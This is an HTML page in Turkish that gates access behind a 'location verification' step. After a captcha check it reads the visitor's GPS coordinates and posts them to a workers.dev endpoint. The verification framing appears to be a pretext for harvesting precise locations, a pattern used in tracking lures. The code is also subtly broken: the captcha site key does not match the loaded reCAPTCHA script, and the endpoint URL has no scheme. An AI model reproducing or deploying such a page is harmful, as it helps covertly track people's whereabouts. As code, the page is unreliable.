<!DOCTYPE html>
<html>
<head>
  <title>Konum Doğrulama</title>
  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
</head>
<body>

<h2>Devam etmek için konum doğrulaması gerekiyor</h2>

<button onclick="getLocation()">Konumu Paylaş</button>

<div class="g-recaptcha" 
     data-sitekey="0x4AAAAAACajPIDrosxxpJU1">
</div>

<script>
async function getLocation() {

  const token = grecaptcha.getResponse();
  if (!token) {
    alert("Captcha doğrulanmadı");
    return;
  }

  navigator.geolocation.getCurrentPosition(async function(position) {

    const data = {
      latitude: position.coords.latitude,
      longitude: position.coords.longitude,
      token: token
    };

    const res = await fetch("disciplinehub.disciplinehub.workers.dev", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    });

    const result = await res.json();
    alert("Konum gönderildi");

  }, function() {
    alert("Konum izni verilmedi");
  });
}
</script>

</body>
</html>
